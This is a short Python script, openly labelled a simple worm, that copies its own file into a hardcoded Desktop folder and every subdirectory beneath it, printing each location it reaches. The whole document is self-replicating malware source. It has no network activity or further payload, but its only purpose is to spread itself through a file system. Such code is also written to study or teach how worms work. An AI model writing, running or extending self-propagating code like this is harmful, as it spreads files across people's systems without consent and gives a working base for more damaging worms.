# Simple worm which duplicates this file into the directories mentioned and all of its sub-directories, and so on

import os
import shutil

def worm(current_file, directory):
  try:
    for parent, directories, files in os.walk(directory):
      destination = os.path.join(parent, os.path.basename(current_file))
      shutil.copy(current_file, destination)
      print(f"Worm replicated to: {destination}")
  except: print("Error")

def main():
  current_file = os.path.basename(__file__)
  directories = [
    "C:\\Users\\sample\\Desktop",
  ]
  for directory in directories:
    if os.path.isdir(directory):
      worm(current_file, directory)

if __name__ == "__main__": main()